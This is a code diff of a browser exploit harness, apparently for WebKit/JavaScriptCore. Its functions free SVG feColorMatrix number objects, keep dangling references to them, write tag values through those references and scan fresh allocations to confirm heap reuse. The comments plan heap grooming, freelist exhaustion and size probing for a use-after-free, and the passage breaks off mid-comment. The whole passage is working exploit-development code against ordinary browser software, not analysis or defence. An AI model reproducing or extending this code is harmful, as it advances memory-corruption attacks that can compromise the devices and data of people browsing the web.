+  if(!q){dis(true);sep();log('PAW2: Mass parallel post-alloc write (512 free + 4096 alloc)','inf');sep();}
 
-  if(typeof WebAssembly==='undefined'){log('  no WebAssembly','bad');if(!q)dis(false);return;}
+  var NA=512,NB=4096;
 
-  // Write incrementing address pattern to wasm memory
-  var WPAGES2=256; // 16MB
-  var wmem2=null;
-  try{wmem2=new WebAssembly.Memory({initial:WPAGES2});}
-  catch(e){log('  wasm.Memory('+WPAGES2+') fail: '+e,'bad');if(!q)dis(false);return;}
-  var wbuf2=wmem2.buffer;
-  var wf32_2=new Float32Array(wbuf2);
-  var wi32=new Int32Array(wbuf2);
-
-  // Write a recognizable pattern: each float32 = its own byte offset
-  // offset 0 → store 0.0, offset 4 → store 4.0, offset 8 → store 8.0, etc.
-  // Any SVGNumber that reads these values tells us its address!
-  // BUT: identity matrix value is 1.0, so we need a non-colliding pattern
-  // Use: float32(offset+0x40000000) — large values not in normal SVG range
-  var BASE_VAL=1073741824.0; // 2^30 = exactly representable in float32
-  for(var wi=0;wi<wf32_2.length;wi++){
-    // write index-based value: BASE_VAL + wi*4 (byte offset)
-    // But float32 ULP at 1GB = 64 bytes, so wi*4 has precision 64 → wi must be multiple of 16
-    // Just store wi*64 to ensure distinguishable values
-    if(wi%16===0)wf32_2[wi]=(wi*64); // 0, 64, 128, 192, ... (all exactly representable at small values)
-  }
-
-  log('  wasm.Memory '+WPAGES2+' pages ('+Math.round(wbuf2.byteLength/1048576)+'MB) filled with pattern','inf');
-
-  // Now alloc many SVGNumbers and check if any have our pattern values
-  var NSVG=2048;
-  var svgs=[];
-  for(var i=0;i<NSVG;i++)svgs.push(makeFCM(identity20()));
+  // Alloc A matrices, collect ALL baseVal refs
+  log('  alloc '+NA+' A matrices, collecting all slot[0] refs...','inf');
+  var As=[];
+  for(var i=0;i<NA;i++)As.push(makeFCM(identity20()));
   await raf();await raf();
 
-  var addrLeaks=[];
-  for(var i=0;i<NSVG;i++){
-    var slots3=readAllSlots(svgs[i].fcm);
-    for(var j=0;j<slots3.length;j++){
-      var sv=slots3[j];
-      if(typeof sv==='number'&&sv>0&&sv%64===0&&sv<wbuf2.byteLength){
-        // This value looks like our pattern! The SVGNumber is at wasm offset sv
-        addrLeaks.push({mat:i,slot:j,wasmOff:sv,byteAddr:sv});
-      }
+  var refsA=[];
+  for(var i=0;i<NA;i++){
+    try{refsA.push(As[i].fcm.values.baseVal[0]);}catch(e){refsA.push(null);}
+  }
+
+  // Free ALL A matrices
+  for(var i=NA-1;i>=0;i--)cleanupD(As[i]);
+  As=null;
+  await raf();await raf();
+
+  log('  '+NA+' freed → alloc '+NB+' B matrices...','inf');
+
+  // Alloc B matrices
+  var Bs=[];
+  for(var i=0;i<NB;i++)Bs.push(makeFCM(identity20()));
+  await raf();await raf();
+
+  // Write TAG via ALL dangling refs
+  var writeOk=0,writeErr=0;
+  for(var i=0;i<refsA.length;i++){
+    if(refsA[i])try{refsA[i].value=TAG_A;writeOk++;}catch(e){writeErr++;}
+  }
+  log('  UAF writes: '+writeOk+' ok, '+writeErr+' threw','inf');
+  refsA=null;
+  await raf();
+
+  // Scan ALL B matrices
+  var totalHits=0,hitSlots=[];
+  for(var i=0;i<Bs.length;i++){
+    for(var j=0;j<20;j++){
+      var v=readSlot(Bs[i].fcm,j);
+      if(v!==null&&Math.abs(v-TAG_A)<0.5){totalHits++;hitSlots.push({mat:i,slot:j});}
     }
   }
 
-  if(addrLeaks.length>0){
-    R.was2_rev_hit=true;
-    R.was2_offset=addrLeaks[0].wasmOff;
-    log('  ADDRESS LEAK! '+addrLeaks.length+' SVGNumbers found in wasm space!','win');
-    for(var ai=0;ai<Math.min(3,addrLeaks.length);ai++){
-      var al=addrLeaks[ai];
-      log('  mat['+al.mat+'] slot['+al.slot+']: wasm_offset='+al.wasmOff+' → wasm_addr=wasm_base+'+al.wasmOff,'win');
-    }
+  R.paw2_hit=totalHits>0;
+  R.paw2_hits=totalHits;
+  R.paw2_rate=totalHits/(NB*20);
+  log('  scanned '+NB+'×20='+NB*20+' slots → '+totalHits+' TAG hits (rate='+(R.paw2_rate*100).toFixed(4)+'%)',totalHits>0?'win':'dim');
+  if(hitSlots.length>0){
+    log('  first 5 hits: '+hitSlots.slice(0,5).map(function(h){return'mat['+h.mat+']slot['+h.slot+']';}).join(' '),'win');
+    log('  ✅ IsoHeap freelist IS being used! Groom confirmed!','win');
   }else{
-    log('  no SVGNumber found in wasm pattern range (no address overlap)','dim');
+    log('  zero hits — IsoHeap freed pages never reused in this test','bad');
   }
 
-  // Clean up
-  for(var i=0;i<NSVG;i++)cleanupD(svgs[i]);
-  wmem2=null;wbuf2=null;wf32_2=null;wi32=null;
-
+  for(var i=0;i<Bs.length;i++)cleanupD(Bs[i]);
+  Bs=null;
   if(!q)dis(false);
 }
 
 /*
- * WAS2: wasm.Memory grow → scan freed IsoHeap pages
+ * PAW3: Sizeof-aware exhaustion sweep
  *
- * Different approach: GROW wasm.Memory repeatedly to map more and more
- * of the address space. At some grow(), wasm.Memory may map a page that
- * bmalloc previously freed. Then we scan the new page for our SVGNumber
- * pattern values.
+ * Try each possible sizeof(SVGNumber) and compute the exact exhaustion count.
+ * For each sizeof, alloc EXACTLY page_capacity new SVGNumbers (one full page worth)
+ * then alloc ONE MORE → if that ONE MORE hits freelist → sizeof confirmed!
  *
- * ALGORITHM:
- * 1. UAF write: write IMPOSSIBLE to freed SVGNumber slot
- * 2. Grow wasm.Memory by 1 page (64KB) at a time, up to 2048 pages (128MB)
- * 3. After each grow, scan the NEW page (last 64KB) for IMPOSSIBLE
- * 4. If found: wasm just mapped an IsoHeap page! We have the offset!
+ * For each sizeof S:
+ *   page_capacity = floor(16384 / S)
+ *   exhaustion_count = page_capacity
+ *
+ * SVGNumber layout options:
+ *   sizeof=8:  vtable(0) + refcount(4) + value(4) = NO vtable (pure value type)
+ *   sizeof=16: vtable(8) + refcount(4) + value(4) = standard polymorphic
+ *   sizeof=24: vtable(8) + refcount(8) + value(4) + pad(4) = with 8-byte RefCount
+ *   sizeof=32: vtable(8) + pad(8) + refcount(4) + value(4) + pad(8) = with full alignment
+ *
+ * Use PAW-style (free first, alloc exhaustion count, write via dangling, scan ALL)
  */
-async function runWAS2(q){
-  if(!q){dis(true);sep();log('WAS2: wasm.Memory grow → scan for freed IsoHeap page','inf');sep();}
+async function runPAW3(q){
+  if(!q){dis(true);sep();log('PAW3: sizeof-aware exhaustion sweep','inf');sep();}
 
-  if(typeof WebAssembly==='undefined'){log('  no WebAssembly','bad');if(!q)dis(false);return;}
+  var sizeofGuesses=[8,12,16,20,24,28,32];
+  var found=false;
 
-  var GROW_TAG=5432109.0;
+  for(var si=0;si<sizeofGuesses.length&&!found;si++){
+    var SZ=sizeofGuesses[si];
+    var PAGE_CAP=Math.floor(16384/SZ);
+    var NMAT=Math.ceil(PAGE_CAP/20);
+    log('  sizeof='+SZ+': page_cap='+PAGE_CAP+' SVGNums → '+NMAT+' matrices needed to exhaust','inf');
 
-  // Create UAF reference first
-  var dUAF=makeFCM(identity20());await raf();
-  var uafRef=null;
-  try{uafRef=dUAF.fcm.values.baseVal[0];}catch(e){}
-  if(!uafRef){log('  UAF ref failed','bad');cleanupD(dUAF);if(!q)dis(false);return;}
-  cleanupD(dUAF);
-  await raf();
+    // Alloc A
+    var dA3=makeFCM(identity20());await raf();
+    var refA3=null;
+    try{refA3=dA3.fcm.values.baseVal[0];}catch(e){}
+    if(!refA3){cleanupD(dA3);continue;}
 
-  // UAF write
-  try{uafRef.value=GROW_TAG;}catch(e){log('  UAF write failed: '+e,'bad');}
+    // Free A
+    cleanupD(dA3);dA3=null;
+    await raf();await raf();
 
-  // Alloc wasm memory and grow it
-  var wmem3=null;
-  try{wmem3=new WebAssembly.Memory({initial:1,maximum:2048});}
-  catch(e){log('  wasm init failed: '+e,'bad');if(!q)dis(false);return;}
+    // Alloc exactly PAGE_CAP new SVGNums (should exhaust one bump page)
+    var Bs3=[];
+    for(var i=0;i<NMAT;i++)Bs3.push(makeFCM(identity20()));
+    await raf();await raf();
 
-  var found3=false;
-  var maxGrows=128; // grow up to 128 times = 8MB scan range
+    // Write TAG via dangling A ref
+    try{refA3.value=TAG_A;}catch(e){}
+    refA3=null;await raf();
 
-  for(var gi=0;gi<maxGrows&&!found3;gi++){
-    try{wmem3.grow(1);}catch(e){log('  grow failed at gi='+gi+': '+e,'bad');break;}
-    var buf3=wmem3.buffer;
-    var f32_3=new Float32Array(buf3);
-    // Scan ONLY the last page (most recent grow)
-    var lastPageStart=f32_3.length-16384; // last 64KB = 16384 float32s
-    for(var si=lastPageStart;si<f32_3.length;si++){
-      if(Math.abs(f32_3[si]-GROW_TAG)<0.5){
-        found3=true;
-        R.was1_scan_hit=true;
-        R.was1_offset=si;
-        log('  ✅ GROW HIT at grow #'+gi+'! TAG found at wasm f32 offset '+si+' (byte '+(si*4)+')','win');
-        // This means wasm just mapped an IsoHeap page that had our freed SVGNumber!
-        log('  wasm_base + '+(si*4)+' bytes = address of freed SVGNumber slot!','win');
-        break;
-      }
-    }
-    if(gi%16===0)log('  grew to '+(gi+2)+' pages ('+(gi+2)*64+'KB), no hit yet','dim');
-  }
+    // Scan all B mats
+    var hit3=scanForTag(Bs3,TAG_A);
+    log('  sizeof='+SZ+' (PC='+PAGE_CAP+', '+NMAT+' mats): '+(hit3?'✅ HIT at mat['+hit3.mat+'] slot['+hit3.slot+']!':'no hit'),hit3?'win':'dim');
+    if(hit3){R.paw3_hit=true;R.paw3_sizeof=SZ;R.paw3_exhaustion=PAGE_CAP;found=true;}
 
-  if(!found3)log('  no IsoHeap page found in '+(maxGrows*64)+'KB of wasm grows','bad');
-
-  wmem3=null;
-  if(!q)dis(false);
-}
-
-/*
- * BRG1: ArrayBuffer backing store → IsoHeap bridge
- *
- * ArrayBuffer(N) on JSC: the buffer's backing store is allocated via
- * WTF::fastMalloc() which is a thin wrapper over bmalloc's WTF heap.
- * WTF heap and IsoHeap are DIFFERENT bmalloc suballocators.
- * BUT: both use bmalloc's underlying SuperRegion and SmallPage infrastructure.
- *
- * If we can find an ArrayBuffer whose backing store is AT THE SAME ADDRESS
- * as a freed SVGNumber, we can:
- * - Read the freed SVGNumber's float via ArrayBuffer[byte_offset/4]
- * - Write to it via ArrayBuffer (bypass UAF volatility)
- *
- * TEST: spray ArrayBuffer(16) — same size as sizeof(SVGNumber)=16 bytes.
- * If WTF malloc and IsoHeap ever share a page... we get overlap.
- *
- * More likely to work: ArrayBuffer(4) or ArrayBuffer(8) in small-allocation path.
- *
- * DETECTION: write IMPOSSIBLE to freed SVGNumber via UAF.
- * Then alloc many ArrayBuffer(16), check if any have our IMPOSSIBLE float bytes.
- *
- * NOTE: ArrayBuffer content is initialized to 0 on alloc, so any non-zero content
- * in a fresh ArrayBuffer = memory reuse from somewhere.
- */
-async function runBRG1(q){
-  if(!q){dis(true);sep();log('BRG1: ArrayBuffer(16) backing store ↔ IsoHeap probe','inf');sep();}
-
-  var BRG_TAG=4444444.0;
-  var tagBytes=new Uint8Array(4);
-  new Float32Array(tagBytes.buffer)[0]=BRG_TAG;
-
-  // Spray freed SVGNumbers with UAF write
-  var NSVG=1024;
-  var svgArr=[];
-  var refs=[];
-  for(var i=0;i<NSVG;i++){
-    svgArr.push(makeFCM(identity20()));
-  }
-  await raf();await raf();
-  // Get refs to ALL slot[0]s
-  for(var i=0;i<NSVG;i++){
-    try{refs.push(svgArr[i].fcm.values.baseVal[0]);}catch(e){refs.push(null);}
-  }
-  // Free ALL
-  for(var i=NSVG-1;i>=0;i--)cleanupD(svgArr[i]);
-  svgArr=null;
-  await raf();await raf();
-  // UAF write IMPOSSIBLE to ALL freed slots
-  for(var i=0;i<refs.length;i++){
-    if(refs[i])try{refs[i].value=BRG_TAG;}catch(e){}
-  }
-  refs=null;
-  await raf();await raf();
-
-  // Now alloc ArrayBuffer(16) - same size as SVGNumber
-  var NBUF=4096;
-  var bufs=[];
-  for(var i=0;i<NBUF;i++)bufs.push(new ArrayBuffer(16));
-  await raf();await raf();
-
-  // Check each ArrayBuffer for our BRG_TAG bytes
-  var brgHits=0;
-  for(var i=0;i<NBUF;i++){
-    var u8=new Uint8Array(bufs[i]);
-    var f32=new Float32Array(bufs[i]);
-    for(var j=0;j<4;j++){
-      if(Math.abs(f32[j]-BRG_TAG)<1){brgHits++;break;}
-    }
-  }
-
-  R.brg1_buf_hit=brgHits>0;
-  log('  ArrayBuffer(16) n='+NBUF+': '+brgHits+' contain BRG_TAG='+(brgHits>0?' ← OVERLAP! WTF∩IsoHeap!':' (no overlap)'),brgHits>0?'win':'dim');
-
-  // Also try ArrayBuffer(8)
-  log('  TestB: ArrayBuffer(8) — try smaller size','inf');
-  var NBUF2=8192;var bufs2=[];
-  for(var i=0;i<NBUF2;i++)bufs2.push(new ArrayBuffer(8));
-  await raf();await raf();
-  var brgHits2=0;
-  for(var i=0;i<NBUF2;i++){
-    var f32b=new Float32Array(bufs2[i]);
-    if(f32b.length>=2&&Math.abs(f32b[0]-BRG_TAG)<1)brgHits2++;
-  }
-  log('  ArrayBuffer(8) n='+NBUF2+': '+brgHits2+' contain BRG_TAG',brgHits2>0?'win':'dim');
-  if(brgHits2>0)R.brg1_buf_hit=true;
-
-  bufs=null;bufs2=null;
-  if(!q)dis(false);
-}
-
-/*
- * SZP1: sizeof(SVGNumber) measurement via timing oracle
- *
- * INSIGHT: when bmalloc exhausts a page boundary, the next alloc
- * requires either (a) a new mmap call or (b) a freelist lookup.
- * Both are SLOWER than the bump allocator path.
- *
- * Measure alloc timing for batches of N matrices.
- * If at N=K the timing suddenly spikes → K is the page boundary.
- * K SVGNumbers per page × sizeof(SVGNumber) = 16384 bytes → sizeof = 16384/K.
- *
- * Resolution: measure time for alloc 1000 batches of size N.
- */
-async function runSZP1(q){
-  if(!q){dis(true);sep();log('SZP1: sizeof(SVGNumber) via allocation timing oracle','inf');sep();}
-
-  // Run N allocs, measure time
-  function benchAlloc(n){
-    var ds=[];
-    var t0=performance.now();
-    for(var i=0;i<n;i++){
-      var svg=document.createElementNS(SVG_NS,'svg');svg.setAttribute('width','1');svg.setAttribute('height','1');
-      svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-      var d=document.createElementNS(SVG_NS,'defs');
-      var f=document.createElementNS(SVG_NS,'filter');f.setAttribute('id','sz'+i);
-      var fm=document.createElementNS(SVG_NS,'feColorMatrix');fm.setAttribute('type','matrix');fm.setAttribute('values','1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0');
-      f.appendChild(fm);d.appendChild(f);svg.appendChild(d);document.body.appendChild(svg);
-      ds.push(svg);
-    }
-    var t1=performance.now();
-    for(var i=ds.length-1;i>=0;i--)if(ds[i].parentNode)ds[i].parentNode.removeChild(ds[i]);
-    return t1-t0;
-  }
-
-  // Warmup
-  benchAlloc(100);
-  await raf();
-
-  // Measure batches at different sizes
-  var sizes=[64,128,256,384,512,640,768,896,1024,1152,1280];
-  var times=[];
-  for(var si=0;si<sizes.length;si++){
-    var t=benchAlloc(sizes[si]);
-    times.push(t);
-    log('  N='+sizes[si]+' SVGNums: '+t.toFixed(1)+'ms ('+((t/sizes[si])*1000).toFixed(2)+'μs/elem)','dim');
+    for(var i=0;i<Bs3.length;i++)cleanupD(Bs3[i]);
+    Bs3=null;
     await raf();await sleep(30);
   }
 
-  // Look for timing spike (indicates page boundary crossing)
-  var maxJump=0,maxJumpAt=-1;
-  for(var i=1;i<times.length;i++){
-    var perUnit=times[i]/sizes[i];
-    var prevPerUnit=times[i-1]/sizes[i-1];
-    var jump=perUnit-prevPerUnit;
-    if(jump>maxJump){maxJump=jump;maxJumpAt=i;}
+  if(!found)log('  PAW3: no sizeof guess triggered freelist groom','bad');
+  if(!q)dis(false);
+}
+
+/*
+ * PAW4: Timed-batch post-alloc write
+ *
+ * Key insight: the IsoHeap freelist is checked on each alloc AFTER the bump allocator.
+ * But the ordering matters — we need to write via dangling ref BETWEEN batch allocs.
+ *
+ * Strategy: alloc small batches, write via ref after EACH batch, scan immediately.
+ * If batch_size < (page_capacity - remaining_bump_slots), the write goes to still-freed mem.
+ * Once the bump page turns over, the next alloc hits freelist → A's slot is reused.
+ * If we write IMMEDIATELY after that alloc, before any GC, we get the TAG.
+ *
+ * Test batch sizes: 1, 2, 4, 8, 16, 32, 64, 128 matrices (20×N SVGNums each)
+ * Try 1024 rounds per batch size, report any hit.
+ */
+async function runPAW4(q){
+  if(!q){dis(true);sep();log('PAW4: Timed-batch post-alloc write (10 rounds per batch)','inf');sep();}
+
+  var batchMats=[1,2,4,8,16,32,64,128];
+  var ROUNDS=10;
+  var found=false;
+
+  for(var bi=0;bi<batchMats.length&&!found;bi++){
+    var BSIZ=batchMats[bi];
+    var hits=0;
+
+    for(var round=0;round<ROUNDS&&!found;round++){
+      // Alloc A
+      var dA4=makeFCM(identity20());
+      var refA4=null;
+      try{refA4=dA4.fcm.values.baseVal[0];}catch(e){}
+      if(!refA4){cleanupD(dA4);continue;}
+      cleanupD(dA4);dA4=null;
+
+      // Alloc batch of B matrices
+      var Bs4=[];
+      for(var i=0;i<BSIZ;i++)Bs4.push(makeFCM(identity20()));
+
+      // Write TAG immediately after batch alloc
+      try{refA4.value=TAG_A;}catch(e){}
+      refA4=null;
+
+      // Scan
+      var hit4=scanForTag(Bs4,TAG_A);
+      if(hit4){hits++;if(hits>=1){R.paw4_hit=true;R.paw4_batch=BSIZ;found=true;
+        log('  PAW4 HIT! batch='+BSIZ+' mats round='+round+': mat['+hit4.mat+'] slot['+hit4.slot+']='+hit4.val,'win');}}
+
+      for(var i=0;i<Bs4.length;i++)cleanupD(Bs4[i]);
+      Bs4=null;
+    }
+    log('  batch='+BSIZ+'×20='+(BSIZ*20)+' SVGNums, '+ROUNDS+' rounds: '+hits+' hits',hits>0?'win':'dim');
+    await raf();await sleep(10);
   }
-  if(maxJumpAt>0){
-    log('  largest timing jump at N='+sizes[maxJumpAt]+' (+'+maxJump.toFixed(3)+'μs/elem)','inf');
-    // IsoHeap page capacity in SVGNumbers ≈ sizes[maxJumpAt] × 20 (slots per matrix)
-    var capacityEstimate=sizes[maxJumpAt]*20;
-    var sizeofEstimate=Math.round(16384/capacityEstimate);
-    R.szp1_sizeof=sizeofEstimate;
-    log('  estimated SVGNumber page capacity: '+capacityEstimate+' → sizeof≈'+sizeofEstimate+' bytes','inf');
+
+  if(!found)log('  PAW4: no hit across all batch sizes','bad');
+  if(!q)dis(false);
+}
+
+/*
+ * PAW5: Reverse exhaustion — bump first, then free, then alloc ONE
+ *
+ * DIFFERENT STRATEGY: instead of freeing first and hoping the bump exhausts,
+ * we INTENTIONALLY FILL the bump page BEFORE freeing A.
+ *
+ * Algorithm:
+ * 1. Alloc PAGE_CAP - 1 FILLER matrices (fills the bump page to the last-but-one slot)
+ * 2. Alloc A matrix (takes the LAST slot on the current bump page)
+ * 3. Get refA
+ * 4. Free A → goes to freelist (the bump page is now full from FILLER + A, then A freed)
+ * 5. Alloc ONE new matrix → bump page is full → must use freelist → gets A's slot!
+ * 6. Write TAG via refA
+ * 7. Read the one new matrix → should show TAG in one of its slots
+ *
+ * This is the CLEANEST possible freelist trigger:
+ * We KNOW the bump page is full (we filled it), so the next alloc MUST use freelist.
+ * The freelist has A's slot (and only A's slot, since we just freed it).
+ * The new alloc MUST get A's slot.
+ *
+ * Try with multiple PAGE_CAP guesses.
+ */
+async function runPAW5(q){
+  if(!q){dis(true);sep();log('PAW5: Reverse exhaustion (fill bump page first, then free, then alloc 1)','inf');sep();}
+
+  var pageCaps=[512,682,819,1024,2048];
+  // 512 → sizeof=32, 682→sizeof=24, 819→sizeof=20, 1024→sizeof=16, 2048→sizeof=8
+
+  var found=false;
+  for(var pi=0;pi<pageCaps.length&&!found;pi++){
+    var PC=pageCaps[pi];
+    var NFILL_MATS=Math.ceil((PC-1)/20); // fill page to PC-1 slots (leave 1 for A)
+    log('  PAW5 PC='+PC+' (sizeof≈'+Math.round(16384/PC)+'): alloc '+(NFILL_MATS*20)+' filler SVGNums...','inf');
+
+    // Alloc FILLER to fill the bump page
+    var fillers=[];
+    for(var i=0;i<NFILL_MATS;i++)fillers.push(makeFCM(identity20()));
+    await raf();await raf();
+
+    // Alloc A — takes the last slot on this bump page
+    var dA5=makeFCM(identity20());
+    var refA5=null;
+    try{refA5=dA5.fcm.values.baseVal[0];}catch(e){}
+    if(!refA5){cleanupD(dA5);for(var i=0;i<fillers.length;i++)cleanupD(fillers[i]);fillers=null;continue;}
+
+    // Free A — bump page is now FULL (from filler), A just freed its last slot
+    // The NEXT allocation MUST come from freelist (which has A's just-freed slot)
+    cleanupD(dA5);dA5=null;
+    await raf();
+
+    // Alloc ONE new matrix (should come ENTIRELY from freelist = A's freed slots)
+    var dNew=makeFCM(identity20());
+    await raf();
+
+    // Write TAG via dangling refA5
+    try{refA5.value=TAG_A;}catch(e){}
+    refA5=null;
+    await raf();
+
+    // Read back from the new matrix
+    var newSlots=readAll(dNew.fcm);
+    var hit5=newSlots.some(function(v){return v!==null&&Math.abs(v-TAG_A)<0.5;});
+    var tagSlot=newSlots.indexOf(newSlots.find(function(v){return v!==null&&Math.abs(v-TAG_A)<0.5;}));
+
+    log('  PC='+PC+': new mat slot[0]='+newSlots[0]+' slot[1]='+newSlots[1]+' → '+(hit5?'✅ HIT at slot['+tagSlot+']!':'no hit'),hit5?'win':'dim');
+
+    cleanupD(dNew);
+    for(var i=0;i<fillers.length;i++)cleanupD(fillers[i]);
+    fillers=null;
+    await raf();await sleep(50);
+
+    if(hit5){R.paw5_hit=true;found=true;log('  PAW5 CONFIRMED: sizeof≈'+Math.round(16384/PC)+' bytes','win');}
   }
+
+  if(!found)log('  PAW5: freelist not triggered for any page capacity guess','bad');
+  if(!q)dis(false);
+}
+
+/*
+ * SZF1: sizeof detection via slot spacing oracle
+ *
+ * ALL 20 SVGNumbers in a feColorMatrix are allocated CONSECUTIVELY in memory.
+ * (WTF::Vector allocs them in a tight array: &baseVal[N] = baseVal_base + N*sizeof(SVGNumber))
+ *
+ * Actually SVGNumberList stores Ref<SVGNumber> objects separately on the heap.
+ * Each SVGNumber IS allocated separately via IsoHeap.
+ * But within a single feColorMatrix, all 20 SVGNumbers are allocated in sequence
+ * (created in a loop in the feColorMatrix constructor).
+ *
+ * CLAIM: adjacent slot refs (baseVal[0] and baseVal[1]) point to CONSECUTIVE memory.
+ * addr(baseVal[1]) = addr(baseVal[0]) + sizeof(SVGNumber)
+ *
+ * We can measure this by:
+ * Alloc A matrix, free A, alloc EXACTLY 1 new SVGNumber via attribute set.
+ * The freed slot of baseVal[0] is at address X.
+ * If we then write to baseVal[0] via dangling ref (writes to X+12 = m_value offset),
+ * and simultaneously read from baseVal[1] via dangling ref (reads from X+sizeof+12),
+ * the difference in their "float as address" interpretation tells us sizeof.
+ *
+ * But we can't directly get raw addresses from JS.
+ *
+ * ALTERNATIVE: use the UAF write + getAttribute oracle.
+ * Write different values to slot[0] and slot[1] via their dangling refs.
+ * After a new alloc (which reuses BOTH slots if they're on the same freed page),
+ * read back via new alloc's getAttribute. The slot order tells us adjacency.
+ *
+ * Even simpler:
+ * Alloc A, free A, alloc B (same number of slots), write distinct values to each
+ * of A's 20 dangling refs (TAG+0, TAG+1, TAG+2, ...).
+ * Scan B for these values. The SLOT INDEX in B where TAG+N appears tells us
+ * which slot in B corresponds to which slot in A → reveals IsoHeap layout.
+ */
+async function runSZF1(q){
+  if(!q){dis(true);sep();log('SZF1: sizeof detection via slot spacing oracle','inf');sep();}
+
+  // Strategy: alloc A (20 SVGNums), free, alloc exactly 20 new SVGNums (1 matrix B)
+  // Write distinct tags to all 20 dangling refs of A (AFTER B is allocated)
+  // Read getAttribute on B's FCM → tells us if/how A's slots map to B's slots
+
+  var dA6=makeFCM(identity20());await raf();
+
+  // Get refs to ALL 20 slots
+  var refs6=[];
+  for(var i=0;i<20;i++){try{refs6.push(dA6.fcm.values.baseVal[i]);}catch(e){refs6.push(null);}}
+  if(refs6.filter(Boolean).length<20){log('  SZF1: could not get all 20 refs','bad');cleanupD(dA6);if(!q)dis(false);return;}
+
+  // Free A
+  cleanupD(dA6);dA6=null;
+  await raf();await raf();
+
+  // Alloc B (exactly 1 matrix = 20 SVGNums)
+  var dB6=makeFCM(identity20());
+  await raf();await raf();
+
+  // Write distinct TAG values via A's dangling refs (AFTER B is created)
+  // Use TAG+i for slot i so we can trace which A-slot maps to which B-slot
+  for(var i=0;i<20;i++){
+    if(refs6[i])try{refs6[i].value=TAG_A+i;}catch(e){}
+  }
+  refs6=null;
+  await raf();
+
+  // Read ALL slots of B via both baseVal AND getAttribute
+  var bSlots=readAll(dB6.fcm);
+  var bAttr=null;try{bAttr=dB6.fcm.getAttribute('values');}catch(e){}
+  log('  B.baseVal after post-alloc write:','inf');
+  log('  '+bSlots.map(function(v,i){return 's'+i+'='+v;}).join(' '),'dim');
+  if(bAttr)log('  B.getAttribute("values")='+bAttr.substring(0,80),'dim');
+
+  // Check for any TAG_A+i values
+  var tagHits=[];
+  for(var i=0;i<bSlots.length;i++){
+    var v=bSlots[i];
+    if(v!==null&&v>TAG_A-0.5&&v<TAG_A+20.5){
+      var slotIdx=Math.round(v-TAG_A);
+      tagHits.push({bSlot:i,aSlot:slotIdx,val:v});
+    }
+  }
+
+  if(tagHits.length>0){
+    log('  SZF1: '+tagHits.length+' slot mappings found!','win');
+    for(var i=0;i<tagHits.length;i++){
+      log('  A-slot['+tagHits[i].aSlot+'] → B-slot['+tagHits[i].bSlot+'] (val='+tagHits[i].val+')','win');
+    }
+    // From slot mapping we can deduce:
+    // If A-slot[K] → B-slot[K]: same-order, both on same page → freelist worked!
+    // If A-slot[K] → B-slot[K+N]: B[K+N] is at A[K]'s address → B and A share memory
+  }else{
+    log('  SZF1: no slot mapping (no groom)','dim');
+  }
+
+  cleanupD(dB6);
+  if(!q)dis(false);
+}
+
+/*
+ * OFF1: All-slots post-alloc write
+ *
+ * Previous tests only wrote to slot[0] via baseVal[0].
+ * The freed SVGNumber is specifically the SVGNumber OBJECT for slot 0 of matrix A.
+ * Other slots of A are DIFFERENT SVGNumber objects at DIFFERENT addresses.
+ *
+ * When IsoHeap reuses A's freed slot objects, each of A's 20 SVGNumber objects
+ * may independently land in any of B's slot positions.
+ * The matching isn't ordered — A's slot[3] might land in B's slot[7].
+ *
+ * Strategy: free ALL 20 of A's SVGNumbers (by freeing A matrix),
+ * alloc B (20 SVGNumbers), write TAG to ALL 20 of A's dangling refs AFTER B alloc,
+ * scan ALL 20 of B's slots.
+ *
+ * Also: try setAttribute("values", ...) as the write mechanism instead of .value =
+ * because setAttribute may write to ALL 20 slots simultaneously.
+ */
+async function runOFF1(q){
+  if(!q){dis(true);sep();log('OFF1: all-slots post-alloc write (all 20 dangling refs)','inf');sep();}
+
+  // Alloc A, get ALL 20 refs, free A, alloc B, write ALL via dangling, scan B
+  var NROUNDS=50;
+  var totalHits=0;
+
+  for(var round=0;round<NROUNDS;round++){
+    var dA7=makeFCM(identity20());
+    var refs7=[];
+    for(var i=0;i<20;i++)try{refs7.push(dA7.fcm.values.baseVal[i]);}catch(e){refs7.push(null);}
+    cleanupD(dA7);dA7=null;
+    await raf();
+
+    var dB7=makeFCM(identity20());
+    await raf();
+
+    // write TAG to all 20 dangling refs
+    for(var i=0;i<20;i++)if(refs7[i])try{refs7[i].value=TAG_A;}catch(e){}
+    refs7=null;
+
+    // scan B
+    var hit7=scanForTag([dB7],TAG_A);
+    if(hit7)totalHits++;
+    cleanupD(dB7);
+    if(round%10===0)await raf();
+  }
+
+  R.off1_hit=totalHits>0;
+  log('  OFF1: '+NROUNDS+' rounds → '+totalHits+' groom hits (rate='+(totalHits/NROUNDS*100).toFixed(1)+'%)',totalHits>0?'win':'dim');
+
+  // TestB: use multiple B matrices per round
+  log('  TestB: alloc 256 B matrices per round','inf');
+  var totalHits2=0,ROUNDS2=20;
+  for(var round=0;round<ROUNDS2;round++){
+    var dA8=makeFCM(identity20());
+    var refs8=[];
+    for(var i=0;i<20;i++)try{refs8.push(dA8.fcm.values.baseVal[i]);}catch(e){refs8.push(null);}
+    cleanupD(dA8);dA8=null;
+    await raf();
+
+    var Bs8=[];for(var i=0;i<256;i++)Bs8.push(makeFCM(identity20()));
+    await raf();
+
+    for(var i=0;i<20;i++)if(refs8[i])try{refs8[i].value=TAG_A;}catch(e){}
+    refs8=null;
+
+    var hit8=scanForTag(Bs8,TAG_A);
+    if(hit8)totalHits2++;
+    for(var i=0;i<Bs8.length;i++)cleanupD(Bs8[i]);
+    Bs8=null;
+    await raf();await sleep(10);
+  }
+  log('  TestB: '+ROUNDS2+' rounds × 256 B mats → '+totalHits2+' hits (rate='+(totalHits2/ROUNDS2*100).toFixed(1)+'%)',totalHits2>0?'win':'dim');
+  if(totalHits2>0)R.off1_hit=true;
 
   if(!q)dis(false);
 }
 
 /*
- * GC1: Force JS GC → check if IsoHeap scavenger triggers
+ * OFF2: Cross-slot contamination probe
  *
- * JSC's GC runs when the JS heap exceeds its high-water mark.
- * On iOS, JSC GC is aggressive — it runs frequently.
- * HYPOTHESIS: when JSC GC runs, it calls bmalloc::Scavenger::run()
- * (or at least sets the flag). This would decommit freed IsoHeap pages
- * and let new allocs use the freelist.
+ * When we write TAG to slot[0]'s dangling ref, the write goes to address X+12.
+ * If sizeof(SVGNumber) = 16, the NEXT SVGNumber (slot[1] in A's original allocation)
+ * is at address X+16. Our write to X+12 affects bytes [X+12, X+15].
+ * The NEXT SVGNumber's m_value is at (X+16)+12 = X+28. No contamination.
  *
